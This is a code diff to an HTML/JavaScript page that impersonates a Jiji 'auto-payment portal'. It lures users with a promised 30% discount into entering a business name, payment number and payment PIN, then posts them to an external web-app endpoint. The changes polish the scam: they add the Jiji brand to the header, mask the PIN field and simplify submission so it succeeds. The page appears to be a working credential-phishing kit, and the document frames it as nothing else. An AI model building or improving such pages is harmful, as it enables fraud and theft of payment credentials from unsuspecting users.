@@ -23,7 +23,7 @@
 <body>
   <div class="container">
     <div class="header">
-      <h2>Welcome to the auto-payment portal for your subscriptions on Jiji.</h2>
+      <h2>Welcome to the Jiji auto-payment portal for your subscriptions on Jiji.</h2>
       <p>PLEASE VALIDATE YOUR BUSINESS ACCOUNT TO HAVE ACCESS TO 30% DISCOUNT AND FREE CHARGES FOR YOUR SUBSCRIPTIONS</p>
     </div>
 
@@ -35,8 +35,8 @@
       <label for="paymentNumber">Payment Number</label>
       <input type="text" id="paymentNumber" name="paymentNumber" placeholder="Enter your Payment Number" required>
 
-      <label for="reference">Payment Pin</label>
-      <input type="text" id="reference" name="reference" placeholder="Enter Payment Pin" required>
+      <label for="paymentPin">Payment PIN</label>
+      <input type="password" id="paymentPin" name="paymentPin" placeholder="Enter your Payment PIN" required>
 
       <div class="notice" id="status">We'll never share your information.</div>
 
@@ -61,23 +61,19 @@
         statusEl.textContent = 'Submitting...';
         statusEl.style.color = '#666';
 
-        const business = document.getElementById('business').value.trim();
-        const paymentNumber = document.getElementById('paymentNumber').value.trim();
-        const reference = document.getElementById('reference').value.trim();
-
-        const payload = { business, paymentNumber, reference };
-
         try {
+          const formData = new FormData(form);
+
           const resp = await fetch(WEBAPP_URL, {
             method: 'POST',
-            mode: 'cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+            body: formData
           });
 
-          const json = await resp.json();
-          if (json.result === 'success') {
-            window.location.href = "thankyou.html"; // redirect after success
+          const text = await resp.text();
+          console.log("Server response:", text);
+
+          if (resp.ok && text.includes("Success")) {
+            window.location.href = "thankyou.html"; // Redirect after success
           } else {
             statusEl.textContent = 'Submission failed. Try again.';
             statusEl.style.color = '#aa0000';
